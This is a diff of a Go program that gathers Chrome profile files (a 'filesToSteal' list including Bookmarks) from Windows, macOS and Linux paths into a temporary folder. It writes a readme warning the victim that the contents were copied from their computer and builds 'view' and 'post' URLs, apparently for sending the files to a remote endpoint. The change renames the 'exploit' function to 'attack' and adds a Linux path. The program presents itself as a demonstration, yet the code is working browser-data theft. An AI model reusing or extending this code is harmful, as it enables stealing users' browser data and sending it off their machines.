@@ -20,9 +20,9 @@ var filesToSteal = []string{
 	"Bookmarks",
 }
 
-const macPath = "/Library/Application Support/Google/Chrome/Default/"
 const winPath = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\"
-const linuxPath = ""
+const macPath = "/Library/Application Support/Google/Chrome/Default/"
+const linuxPath = "~/.config/google-chrome/Defaults/"
 
 const readmeMessage = `This is just an example of what could be easily stolen from you,
 all the contents in this folder were copied from your computer to here.
@@ -46,7 +46,7 @@ func main() {
 	switch runtime.GOOS {
 	case "windows":
 		tmpStolenFilesFolder := user.HomeDir + "\\AppData\\Local\\Temp\\" + tmpStolenFilesFolderName + "\\"
-		if exploit(winPath, tmpStolenFilesFolder, user, true) {
+		if attack(winPath, tmpStolenFilesFolder, user, true) {
 
 			cmd := exec.Command("cmd", "/C", "start", tmpStolenFilesFolder)
 			cmd.Run()
@@ -57,17 +57,17 @@ func main() {
 		}
 	case "darwin":
 		tmpStolenFilesFolder := "/tmp/" + tmpStolenFilesFolderName + "/"
-		if exploit(macPath, tmpStolenFilesFolder, user, false) {
+		if attack(macPath, tmpStolenFilesFolder, user, false) {
 			cmd := exec.Command("open", tmpStolenFilesFolder)
 			cmd.Run()
 		}
 	default:
 		tmpStolenFilesFolder := "/tmp/" + tmpStolenFilesFolderName + "/"
-		exploit(linuxPath, tmpStolenFilesFolder, user, false)
+		attack(linuxPath, tmpStolenFilesFolder, user, false)
 	}
 }
 
-func exploit(osPath string, tmpStolenFilesFolder string, user *user.User, isWin bool) bool {
+func attack(osPath string, tmpStolenFilesFolder string, user *user.User, isWin bool) bool {
 	// concatenate the os path to each file
 	var files []string
 	for _, f := range filesToSteal {
@@ -89,7 +89,7 @@ func exploit(osPath string, tmpStolenFilesFolder string, user *user.User, isWin 
 	// (may happen only if someone is using the same randomly generated string before refreshing the page)
 	randomString := utils.GenerateRandomString(40)
 	dummyEndpointToViewUrl := urlBuilder("view", randomString)
-	dummyEndpointToPost := urlBuilder("post", randomString)
+	dummyEndpointToPost := urlBuilder("post", randomString)	
 
 	// create readme
 	readmeFile := tmpStolenFilesFolder + "readme.txt"
